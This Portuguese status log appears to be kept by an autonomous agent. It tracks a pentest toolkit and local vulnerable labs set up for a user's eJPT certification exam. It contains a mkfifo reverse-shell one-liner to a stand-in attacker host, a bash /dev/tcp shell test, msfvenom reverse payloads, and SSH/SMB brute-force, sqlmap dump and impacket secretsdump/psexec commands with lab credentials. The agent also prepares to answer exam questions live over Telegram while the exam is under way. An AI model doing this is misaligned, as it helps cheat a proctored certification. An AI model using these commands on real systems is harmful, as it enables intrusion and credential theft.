# Status das Ferramentas — eJPT
Verificado em **2026-10-14 16:11** (véspera do exame), com testes de execução REAIS, não só `--version`.
**RE-VERIFICADO em 2026-10-18 14:20-14:35** (nova véspera) — ver seção "ATUALIZAÇÃO 18/OUT" no fim do arquivo:
msfdb inicializado, john consertado, wordlists baixadas, lab SSH adicionado, e 3 pitfalls de snap documentados.

Ambiente de APOIO do LIBERTUS (Ubuntu do Lorran). No exame o Kali é fornecido pela INE via browser — lá tudo é completo. Este arsenal é o que LIBERTUS usa pra simular/validar antes e durante.

---

## Núcleo do exame

| Ferramenta | Caminho | Versão | Status | Teste real feito |
|-----------|---------|--------|--------|------------------|
| **nmap** | /snap/bin/nmap | 7.992 (18/out) | ✅ OK | `nmap -Pn -p 22,80,8080 --open 127.0.0.1` → 8080 open. 620 scripts NSE. **Não lê arquivos em /tmp** |
| **msfconsole** | /snap/bin/msfconsole | 6.4.126-dev | ✅ OK | `search` achou `ms17_010_eternalblue`, `vsftpd_234_backdoor`, `ssh_login`, `autoroute`, `socks_proxy`. Aviso ">2 semanas" é cosmético |
| **hydra** | /usr/local/bin/hydra | v9.8dev | ⚠️ PARCIAL | **Sem módulos SSH/SSL** (ver gap abaixo). FTP e HTTP funcionam |
| **gobuster** | /home/libertus/go/bin/gobuster | 3.8.2 | ✅ OK | Rodou contra DVWA:8080 → achou /config, /docs, /external, /php.ini, robots.txt |
| **sqlmap** | /snap/bin/sqlmap | 1.8.12#pip | ✅ OK | Rodou contra DVWA (não injetável sem sessão — esperado). Detecção/extração funcionam |
| **netcat** | /usr/bin/nc | OpenBSD nc 1.226 | ✅ OK | Banner grab em 127.0.0.1:3000 OK. Variante BSD: **sem `-e`** → usar reverse shell via mkfifo |
| **john** | /usr/local/bin/john | John jumbo | ✅ OK (via wrapper) | **Quebrou hash sha512crypt de verdade** → `user:password`. Sempre chamar via `jl.sh` |
| **sshpass** | ~/.local/bin/sshpass | 1.10 | ✅ OK (NOVO) | Compilado do source hoje 16:11 pra cobrir o gap de SSH do hydra |

## Arsenal extra disponível

| Ferramenta | Caminho | Versão | Nota |
|-----------|---------|--------|------|
| **nuclei** | ~/go/bin/nuclei | v3.9.0 | Templates em ~/nuclei-templates |
| **ffuf** | ~/go/bin/ffuf | 2.1.0 | Fuzzing rápido de dirs/params |
| **gobuster** | ~/go/bin/gobuster | 3.8.2 | dir/vhost/dns/fuzz |
| **subfinder** | ~/go/bin/subfinder | v2.14.0 | Enumeração de subdomínios |
| **nikto** | /usr/local/bin/nikto | 2.6.1 | Fonte (git /opt/nikto), SSL funcionando |
| **sshpass** | ~/.local/bin/sshpass | 1.10 | Bruteforce SSH (ver sshbrute.sh) |

**Ausentes:** wpscan, whatweb, ncat, medusa, ncrack, proxychains, responder, exploitdb/searchsploit.
- **searchsploit ausente** → usar https://www.exploit-db.com pelo navegador, ou `msfconsole search` (tem centenas de exploits).
- **proxychains ausente** → para eJPT, usar `auxiliary/server/socks_proxy` do MSF + `route add`/`autoroute` (não exige proxychains no host).

---

## ⚠️ GAP PRINCIPAL: hydra sem SSH

`hydra -h` mostra: *"These services were not compiled in: afp firebird memcached mongodb mysql5 ncp oracle postgres radmin2 rdp sapr3 **ssh sshkey** svn smb2 SSL-services (ftps, sip, rdp, oracle-services, ...) and regex support."*

O binário local foi compilado sem `libssh-dev`. **Não dá pra corrigir sem sudo** (sudo exige senha; nenhum humano presente nesta sessão de cron).
- **No exame isso NÃO importa** — o Kali da INE tem hydra completo com SSH.
- **Localmente**, usar os fallbacks abaixo (todos testados funcionando):

### Fallback 1 — MSF ssh_login (nativo, embutido)
```bash
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; set THREADS 4; run"
```
Após achar: `sessions -l` → `sessions -i 1`.

### Fallback 2 — nmap ssh-brute
```bash
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP
```

### Fallback 3 — sshbrute.sh (wrapper sshpass, criado hoje)
```bash
bash ~/LIBERTUS/ejpt/sshbrute.sh IP [USER] [WORDLIST]
# ex: bash ~/LIBERTUS/ejpt/sshbrute.sh 192.168.100.10 auditor /usr/share/wordlists/rockyou.txt
```

**Fix definitivo (quando o Lorran estiver presente e puder digitar a senha do sudo):**
```bash
sudo apt install -y libssh-dev
cd /tmp && git clone https://github.com/vanhauser-thc/thc-hydra.git && cd thc-hydra
./configure && make -j$(nproc) && sudo make install
hydra -h | tail -3   # 'ssh' deve sair da lista de 'not compiled in'
```

---

## John — usar SEMPRE via wrapper
Binário direto dá "Cannot find John home". Wrapper testado hoje (quebrou sha512crypt):
```bash
bash ~/LIBERTUS/ejpt/john_home/jl.sh hash.txt --format=sha512crypt
bash ~/LIBERTUS/ejpt/john_home/jl.sh hash.txt            # auto-detecta
bash ~/LIBERTUS/ejpt/john_home/jl.sh --show hash.txt
```
Formatos úteis: `sha512crypt` (Linux /etc/shadow), `NT` (NTLM Windows — `hashdump`), `bcrypt`, `ssh` (chaves via ssh2john), `raw-md5`.

## Netcat — variante BSD (sem `-e`)
Listener: `nc -lvnp 4444`
Reverse shell Linux sem `-e`:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATACANTE 4444 >/tmp/f
```
No Kali da INE o nc/ncat tem `-e` normalmente.

## Wordlists locais
- `/usr/share/wordlists/rockyou.txt` — 14M senhas, descomprimido ✅
- `/usr/share/wordlists/common.txt` — dirs web (38KB) ✅
- Rules do John: `~/LIBERTUS/ejpt/john_home/rules/` (ex: rockyou-30000.rule)
- **No Kali da INE:** rockyou vem `.gz` → `gunzip /usr/share/wordlists/rockyou.txt.gz` antes. common.txt NÃO existe lá → usar `/usr/share/wordlists/dirb/common.txt` ou `fasttrack.txt`.

## Lab local (docker) — ONLINE hoje
| Alvo | URL | Status teste |
|------|-----|--------------|
| DVWA | http://localhost:8080 | ✅ HTTP 302 → login.php (admin/password). Container `libertus-dvwa` UP |
| Juice Shop | http://localhost:3000 | ✅ HTTP 200. Container `libertus-juiceshop` UP |
| SSH alvo (novo 18/out) | `ssh -p 2222 msfadmin@127.0.0.1` | ✅ Container `libertus-ssh` UP, senha `msfadmin` — serve pra treinar bruteforce |
| FTP alvo (novo 18/out) | `ftp://127.0.0.1:2121` (test:test123) | ✅ sobe com `~/venvs/pentest/bin/python -m pyftpdlib -p 2121 -u test -P test123 -d /tmp/ftproot` |

Comando: `cd ~/LIBERTUS/lab && docker compose up -d dvwa juiceshop`

---

## Veredito
**Arsenal pronto para o exame.** Tudo executa. Ajustes documentados:
1. **John** via `~/bin/john` (wrapper novo) ou `jl.sh` — os dois funcionam.
2. **hydra local sem SSH/RDP** → usar MSF `ssh_login` / `ssh_brute.py` / `nmap ssh-brute`.
3. **Arquivos sempre em `$HOME`** — snaps não veem `/tmp`.

No Kali da INE (ambiente do exame) todas essas ferramentas são completas — os fallbacks são só para o apoio local do LIBERTUS.

---

# ATUALIZAÇÃO 18/OUT/2026 — re-verificação da noite pré-exame

Tudo abaixo foi executado nesta máquina, com output real, entre 14:20 e 14:35.

## O que estava quebrado e foi consertado hoje

### 1. Metasploit sem banco de dados → CONSERTADO
Antes: `msfdb status` → `No database found`.
Agora: `msfdb init` rodou com sucesso. O snap **já traz PostgreSQL embutido**
(`~/snap/metasploit-framework/common/.msf4/db`) — não precisa de sudo nem instalar nada.

```
$ msfdb status
Database started
$ msfconsole -q -x "db_status; version"
[*] Connected to msf. Connection type: postgresql.
Framework: 6.4.126-dev
```

Por que importa no exame: `creds` (credenciais achadas), `loot`, `hosts`, `services`,
`db_import` de nmap e workspaces por máquina. Sem DB, tudo isso fica manual.
Se cair: `msfdb restart`. Se `msfconsole` disser "not connected": `msfdb init` de novo.

### 2. John the Ripper quebrado → CONSERTADO
Sintomas reais:
```
$ john --list=build-info
Error: Cannot find John home. Invoke the program via full or relative pathname.

$ /usr/local/bin/john --wordlist=... hash
fopen: /usr/local/bin/rules/d3ad0ne.rule: No such file or directory
```
Causa: instalação incompleta — só 5 dos ~14 arquivos de regra estavam em `/usr/local/bin/rules`,
e o `john.conf` incluía arquivos inexistentes (`unisubst.conf`, `rules-by-score.conf`).

Conserto (sem sudo):
- criado `~/john-home/` completo (binário + .conf + .chr + rules/)
- baixados de `github.com/openwall/john` (branch `bleeding-jumbo`, pasta `run/`) os 13 rules + confs faltantes
- wrapper `~/bin/john` → `exec /home/libertus/john-home/john "$@"`

Teste real:
```
$ echo -n minhasenha | md5sum ...
$ john --format=raw-md5 --wordlist=/tmp/l.txt /tmp/h.md5
minhasenha       (?)
1g 0:00:00:00 DONE ... 
$ john --show --format=raw-md5 /tmp/h.md5
1 password hash cracked, 0 left
```
`john` já resolve pelo PATH para o wrapper. **Nunca chamar `/usr/local/bin/john` direto.**

### 3. Faltavam wordlists de diretório → BAIXADAS
SecLists não existe no apt do Ubuntu 24.04 e não há sudo sem senha → baixado do GitHub (raw):
```
~/wordlists/web/directory-list-2.3-medium.txt   220.559 linhas   <- a principal
~/wordlists/web/directory-list-2.3-small.txt     87.663 linhas
~/wordlists/web/raft-small-words.txt             43.007 linhas
~/wordlists/web/raft-medium-directories.txt      29.999 linhas
~/wordlists/web/subdomains-5000.txt               5.000 linhas
~/wordlists/pass/top1000.txt                      1.000 linhas
~/wordlists/pass/top10k.txt                      10.001 linhas
~/wordlists/pass/500-worst.txt                      499 linhas
~/wordlists/user/top-usernames.txt                   17 linhas
```
Nomes do repo mudaram: os antigos `directory-list-2.3-*.txt` agora são
`DirBuster-2007_directory-list-2.3-*.txt`; `10-million-password-list-top-1000.txt` virou `Pwdb_top-1000.txt`.

## 🔴 PITFALL NOVO E CRÍTICO: snaps não enxergam /tmp

Vale para **nmap, sqlmap, msfconsole, msfvenom** (todos via snap). O snap tem namespace
privado de `/tmp`. Consequência prática no exame/apoio:

```
$ nmap -iL /tmp/t.txt ...
Failed to open input file /tmp/t.txt for reading: No such file or directory (2)
$ nmap -iL ~/t.txt ...
8080/tcp open  http-proxy          <- OK

$ sqlmap -r /tmp/req.txt
[CRITICAL] specified HTTP request file '/tmp/req.txt' does not exist
$ sqlmap -r ~/req.txt
(arquivo lido; reclamou só de falta de parâmetros)   <- OK

$ msfconsole ... set PASS_FILE /tmp/sshpass.txt
[-] Msf::OptionValidateError One or more options failed to validate: PASS_FILE
$ set PASS_FILE /home/libertus/wordlists/pass/test_ssh.txt
[+] Success: 'msfadmin:msfadmin'    <- OK

$ msfvenom -p linux/x64/shell_reverse_tcp ... -o /tmp/rev.elf
Saved as: /tmp/rev.elf
$ ls /tmp/rev.elf
ls: cannot access '/tmp/rev.elf': No such file or directory   <- MENTIRA do snap
$ msfvenom ... -o ~/payloads/rev.elf
-rw-rw-r-- 1 libertus libertus 194 rev.elf                      <- OK
```

**REGRA:** todo arquivo de entrada/saída de ferramenta snap → `/home/libertus/...`.
Se o exame for no Kali da INE isso não se aplica (lá tudo é nativo), mas no apoio local vale sempre.
Pasta canônica criada: `~/payloads/` para shells e `~/loot/` para hashes/arquivos.

## Confirmações novas (testes reais)

### Hydra também não tem RDP
```
$ hydra ... rdp://127.0.0.1
[ERROR] Compiled without FREERDP support, modules not available!
```
Além do SSH (libssh) já documentado. Lista real de serviços compilados:
`adam6500 asterisk cisco cisco-enable cobaltstrike cvs ftp http-{head|get|post} http-{get|post}-form
http-proxy http-proxy-urlenum icq imap irc ldap2 ldap3 mssql mysql pcnfs pop3 redis rexec rlogin
rpcap rsh rtsp s7-300 smb smtp smtp-enum snmp socks5 teamspeak telnet vmauthd vnc xmpp`
→ tem **ftp, http-form, smb, mysql, mssql, vnc, telnet, pop3, imap, snmp**; falta **ssh e rdp**.

### Hydra FTP — true positive confirmado
Contra servidor FTP local real: `[2121][ftp] login: test password: test123` ✅
E o HTTP-POST-FORM contra DVWA 1.10 deu **falso positivo** (`admin:123456789`), porque o app
exige `user_token` (CSRF) e a string `F=` não existia na resposta. **Sempre validar com `curl` antes de responder.**

### Gobuster em SPA (Juice Shop) precisa de --exclude-length
```
the server returns a status code that matches ... non existing urls ... => 200 (Length: 9903)
gobuster dir -u http://localhost:3000 -w ~/wordlists/web/raft-small-words.txt --exclude-length 9903
→ media, assets, api, ftp ...
```
Em app normal (DVWA) funcionou direto: `docs, external, config, vulnerabilities`.

### sqlmap validado de ponta a ponta no DVWA
Com sessão autenticada (`PHPSESSID` + `security=low`), detectou:
boolean-based blind, error-based (FLOOR), time-based blind (SLEEP), UNION query 1-20 colunas ✅

### Netcat
Loopback listener 4444 recebeu dados e `nc -lvnp 5555` recebeu shell ✅ (OpenBSD nc, sem `-e`).

### SSH bruteforce — duas rotas validadas contra alvo real (container 2222)
```
# 1) paramiko (novo script)
$ ~/venvs/pentest/bin/python ~/LIBERTUS/ejpt/ssh_brute.py -t 127.0.0.1 -p 2222 -l msfadmin -P /tmp/sshpass.txt
[+] SUCESSO: msfadmin:msfadmin

# 2) Metasploit
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 127.0.0.1; set RPORT 2222; \
 set USERNAME msfadmin; set PASS_FILE /home/libertus/wordlists/pass/test_ssh.txt; \
 set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y"
[+] 127.0.0.1:2222 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) ...'
[*] SSH session 1 opened
```
Nota: com `VERBOSE false` o msf parece "não achar nada" (não imprime nada). Usar `VERBOSE true`
ou conferir com `creds`/`sessions -l`. Sempre sair com `exit -y` quando há sessão aberta.

## Lab local atualizado (Docker)

| Container | Serviço | Acesso |
|---|---|---|
| libertus-dvwa | DVWA 1.10 (PHP/MySQL) | http://localhost:8080 — admin:password (login exige user_token) |
| libertus-juiceshop | OWASP Juice Shop | http://localhost:3000 |
| libertus-ssh | OpenSSH 10.3 | `ssh -p 2222 msfadmin@127.0.0.1` (msfadmin:msfadmin) |

DVWA foi inicializado hoje: banco criado via `setup.php` → login validado (302 → index.php, "Welcome to DVWA").
Obs: DVWA 1.10 exige `user_token` no login — em versões antigas (1.9) não tem, e é assim que aparece em labs.

Script pra subir tudo: `bash ~/LIBERTUS/ejpt/lab_up.sh`

## Veredito atualizado
**Pronto.** 8/8 ferramentas do escopo executam. 3 correções aplicadas nesta noite
(msfdb, john, wordlists), 2 alvos novos de prática (SSH/FTP), 1 substituto criado para o gap do hydra
(`ssh_brute.py`, testado). Único risco residual: hydra local não faz SSH/RDP — no Kali da INE faz.

---

# ATUALIZAÇÃO 19/OUT/2026 10:10-10:25 — re-verificação com EXECUÇÃO REAL

Não foi só `--version`: cada linha abaixo rodou contra alvo de verdade (lab local) hoje.

| Ferramenta | Versão | Teste executado hoje | Resultado |
|---|---|---|---|
| nmap | 7.992 | `-sV --script smb-os-discovery,smb-vuln-ms17-010` em 172.28.77.11 | ✅ OS/Samba + workgroup LAB. **1238 scripts NSE** presentes (em `/snap/nmap/5415/usr/share/nmap/scripts/`) |
| msfconsole | 6.4.126-dev | `search ms17_010`, `search ssh_login`, `smb_login` real | ✅ `ms17_010_eternalblue`, `ms17_010_psexec`, vsftpd presentes. **`smb_login` achou `analyst:LabPass123!`** em 172.28.77.11 |
| msfvenom | 6.4.126 | `-l payloads` | ✅ 3 variantes `windows/x64/meterpreter/reverse_tcp` |
| hydra | 9.8dev | HTTP-POST contra DVWA + SSH contra lab 2222 | ⚠️ HTTP/FTP OK. SSH: `[ERROR] Compiled without LIBSSH` (confirmado hoje). **2 falsos positivos** no mesmo run |
| gobuster | 3.8.2 | `dir` contra localhost:8080 | ✅ achou config, docs, external, php.ini, login.php, robots |
| sqlmap | 1.8.12#pip | `--dbs` + `-D dvwa -T users --dump` com cookie de sessão | ✅ **extraiu o banco e a tabela users** (5 linhas, hashes md5) |
| john | jumbo 1.9.0 (2026-04) | `jl.sh --format=raw-md5` em 3 hashes do dump | ✅ **3/3 quebrados**: password, abc123, letmein |
| netcat | OpenBSD 1.226 | `nc -lvnp 4455` + `bash -i >& /dev/tcp/...` | ✅ `Connection received on 127.0.0.1`. Sem `-e` (usar mkfifo ou /dev/tcp) |
| ssh_brute.py | — | `-t 127.0.0.1 -p 2222 -l msfadmin` | ✅ **`[+] SUCESSO: msfadmin:msfadmin`** em 0,3 s |
| **impacket (NOVO)** | 0.13.1 | instalação + scripts no venv | ✅ `smbclient.py`, `psexec.py`, `secretsdump.py`, `wmiexec.py`, `smbexec.py` em `~/venvs/pentest/bin/` |

## Novidades / correções desta noite

1. **Impacket installed** (`uv pip install --python ~/venvs/pentest/bin/python impacket`) — cobre a
   **ausência de `smbclient` no host**. No Kali da INE o smbclient nativo existe; aqui o equivalente é:
   ```bash
   ~/venvs/pentest/bin/smbclient.py analyst:'LabPass123!'@172.28.77.11
   ~/venvs/pentest/bin/psexec.py analyst:'LabPass123!'@IP
   ~/venvs/pentest/bin/secretsdump.py -sam -system -ntds <arquivos>
   ```
2. **`lab_up.sh` criado** — era citado na documentação mas **não existia** no disco. Agora existe,
   testado: `bash ~/LIBERTUS/ejpt/lab_up.sh` sobe DVWA + Juice + SSH e imprime tabela de status.
3. **Lab SMB descoberto e validado** (estava rodando, mas ninguém documentou):
   `smb-legacy` 172.28.77.11 (SMB1, shares `publico`/`financeiro`/`rh`),
   `smb-modern` 172.28.77.12, atacante `smb-cli` 172.28.77.50.
   Credencial de treino: **`analyst : LabPass123!`** (só `financeiro` e `rh`; `publico` é anônimo).
4. **Pitfall novo — smbclient contra SMB1:** o cliente moderno recusa NT1 por padrão. Contra o lab legado:
   ```bash
   smbclient -L //172.28.77.11 -N --option='client min protocol=NT1' --option='client max protocol=NT1'
   smbclient //172.28.77.11/rh -U 'analyst%LabPass123!' --option='client min protocol=NT1' --option='client max protocol=NT1' -c 'ls'
   ```
   Sem os dois `--option`, erro enganoso: `NT_STATUS_CONNECTION_DISCONNECTED` / `NT_STATUS_INVALID_PARAMETER_MIX`.
5. **Pitfall novo — `nmap --script ssh-brute` FALHA neste ambiente:** `nse_restore: WAITING_TO_RUNNING error!`
   (reproduzido 2x, nmap 7.992 snap). Não perder tempo: usar `ssh_brute.py` (validado) ou `msf ssh_login`.
6. **Pitfall reconfirmado — hydra HTTP-POST com CSRF token dá falso positivo.** Hoje, contra o DVWA,
   hydra devolveu **duas** senhas válidas (`password` e `123456`); confirmação com POST real mostrou que
   **`123456` falha**. Regra: nunca responder questão com resultado de hydra sem confirmar com `curl -i`/login real.

## Estado do lab (19/out 10:20)

| Alvo | Status | Acesso |
|---|---|---|
| DVWA | ✅ HTTP 302 (redirect p/ login.php — normal) | http://localhost:8080 — admin:password |
| Juice Shop | ✅ HTTP 200 | http://localhost:3000 |
| SSH lab | ✅ porta 2222 aberta | `ssh -p 2222 msfadmin@127.0.0.1` (msfadmin:msfadmin) |
| SMB legacy | ✅ 445 com shares | `analyst:LabPass123!` (via smb-cli 172.28.77.50) |
| SMB modern | ✅ 445 | idem |
| WebGoat (8888) | ❌ **offline** — imagem `webgoat/goat-and-wolf` **não está baixada** (97% de disco, 2,7 GB livres) | `cd ~/LIBERTUS/lab && docker compose up -d webgoat` (baixa ~600 MB) |

## Canal de comunicação
`hermes-gateway.service`: **active (running)** desde 10:09 de hoje. Telegram pronto.

## Veredito 19/out
**8/8 ferramentas do escopo funcionam.** Dois gaps conhecidos e ambos com substituto validado:
hydra sem SSH → `ssh_brute.py`/msf; sem smbclient → impacket. Nada bloqueia o apoio de amanhã.

---

# ATUALIZAÇÃO 20/OUT/2026 11:06-11:20 — véspera do exame (voucher comprado amanhã)

Re-verificação completa, com execução real, e **3 ferramentas novas instaladas**.
Tudo abaixo rodou nesta máquina hoje; nenhuma linha é memória.

## Quadro final (o que responder em 5 segundos)

| Ferramenta | Versão | Estado | Teste real de HOJE |
|---|---|---|---|
| nmap | 7.992 (snap) | ✅ | `-sT -Pn -p8080,3000,22,445 --open 127.0.0.1` → 3000/8080 open |
| msfconsole | 6.4.126-dev (snap) | ✅ | `db_status` → **postgresql conectado**; ms17/vsftpd/ssh_login/socks/autoroute carregam |
| msfvenom | 6.4.126-dev | ⚠️ só `$HOME` | gerou ELF 194 B em `~/rev_test.elf` (`/tmp` falha silencioso) |
| hydra | 9.8dev | ⚠️ **sem SSH** | http-post-form achou `admin:password` em form sem CSRF ✅; SSH → `Compiled without LIBSSH` ❌ |
| gobuster | (go/bin) | ✅ | `dir` no DVWA: `docs`, `external`, `config`, `vulnerabilities` |
| sqlmap | 1.8.12#pip | ✅ | SQLi no DVWA + **banner `10.1.26-MariaDB`** em ~10 s |
| netcat | OpenBSD 1.226 | ✅ | `nc -lvnp 4555` recebeu `test` (sem `-e`) |
| john | 1.9.0-jumbo bleeding | ✅ | `--format=raw-md5` → `password` (12.800 p/s) |
| nikto / ffuf / nuclei | 2.6.1 / 2.1.0 / 3.9.0 | ✅ | versões executam |
| **proxychains4** | ng (fonte, `~/.local`) | ✅ NOVO | config `~/.local/etc/proxychains.conf` carregada; chain executada |
| **searchsploit** | exploitdb 360 MB | ✅ NOVO | `ms17-010` → 6 exploits; `-m 42315` baixou |
| **impacket** | 0.13.1 (`~/venvs/pentest`) | ✅ validado | SMB2 local: shares `IPC$`,`SHARE` + leitura de arquivo |
| ssh_brute.py | próprio | ✅ | `msfadmin:msfadmin` na 2222 em 0,1 s |
| msf `ssh_login` | — | ✅ | `Success` + **SSH session 1 opened** na 2222 |

## 3 pitfalls que continuam valendo (reconfirmados hoje com erro exato)

1. **Snap não vê `/tmp`** (nmap, sqlmap, msfconsole, msfvenom):
   `nmap ... -oN /tmp/nmap_tmp.txt` → exit 0, **arquivo não existe**. Em `~` → 357 bytes ✅.
2. **msf (snap) NÃO lê `/usr/share/wordlists`** — pitfall NOVO de hoje:
   ```
   set PASS_FILE /usr/share/wordlists/rockyou.txt
   [-] Msf::OptionValidateError ... failed to validate: PASS_FILE
   set PASS_FILE /home/libertus/wordlists/pass/top1000.txt   # aceito ✅
   ```
   → todo comando msf usa `~/wordlists/...`, nunca `/usr/share/...`.
3. **hydra mente quando o login responde 302 com corpo vazio** (DVWA 1.10):
   falha = `302 Location: login.php` corpo 0 bytes; acerto = `302 Location: index.php`.
   `F=Login failed` nunca aparece → qualquer palpite vira "achado". Contra form sem CSRF (teste 8099)
   o mesmo comando acertou de primeira. **Regra: confirmar com `curl -s -i` antes de responder.**

## O que foi instalado hoje (sem sudo)

- **proxychains-ng** compilado do fonte → `~/.local/bin/proxychains4` + `~/.local/etc/proxychains.conf`
  (`strict_chain`, `socks5 127.0.0.1 1080`, `proxy_dns`). Fecha o gap de pivot fora do msf.
- **exploitdb + searchsploit** → `~/exploitdb` (360 MB), `~/bin/searchsploit`, `~/.searchsploit_rc`
  apontando para `$HOME/exploitdb` (o padrão `/opt` não é gravável). `--update` funciona.
- **impacket** também no `~/LIBERTUS/venv` (redundante): o canônico continua `~/venvs/pentest/bin/`,
  que tem **paramiko** junto (necessário pro `ssh_brute.py`).

## SMB sem smbclient — padrão validado hoje
`smbserver.py -smb2support -port 4450 SHARE /tmp/smbshare` (impacket) como alvo:
```
SHARES: ['IPC$', 'SHARE'] ; ARQUIVO: notes.txt 46 bytes
CONTEUDO LIDO: credencial: usuario=analyst senha=LabPass123!
```
Detalhes que economizam tempo:
- `smbclient.py -port` **só aceita 139/445** → para porta não padrão usar `SMBConnection(sess_port=...)`.
- `getFile(share, path, callback)` exige callback (`io.BytesIO().write`), não retorna bytes.
- `msf auxiliary/scanner/smb/smb_login` recusa credencial vazia (`Invalid Cred details can't be blank`)
  → share anônimo: impacket com `login('','')`, ou `nmap --script smb-enum-shares`.

## Lacunas restantes (todas com substituto)
`smbclient` ❌ → impacket · `enum4linux` ❌ → nmap smb-* + impacket · `whatweb` ❌ → `curl -I` +
`http-headers` · `wpscan` ❌ → `http-wordpress-enum` · hydra sem SSH/RDP → `ssh_brute.py` / msf ·
ncat ❌ → `nc` OpenBSD · `whois`/`dnsrecon` ❌ → `dig` + `nmap --script dns-*`.

## Wordlists (contagem real, 20/out)
`directory-list-2.3-medium` 220.559 · `-small` 87.663 · `raft-small-words` 43.007 ·
`raft-medium-directories` 29.999 · `subdomains-5000` 5.000 · `pass/top1000` 1.000 ·
`pass/top10k` 10.000 · `pass/500-worst` 500 · `user/top-usernames` 10 ·
`/usr/share/wordlists/rockyou.txt` 13.992.149 · `common.txt` 4.000.
⚠️ rockyou/common em `/usr/share` = invisíveis para o msf. hydra/gobuster leem normal.

## Veredito 20/out
**Arsenal completo.** 18 ferramentas verificadas em execução, 3 gaps fechados hoje (proxychains,
searchsploit, impacket SMB validado). Os únicos limites são de snap (`/tmp`, `/usr/share`) e do hydra
(sem SSH) — todos com caminho alternativo testado nesta mesma noite.

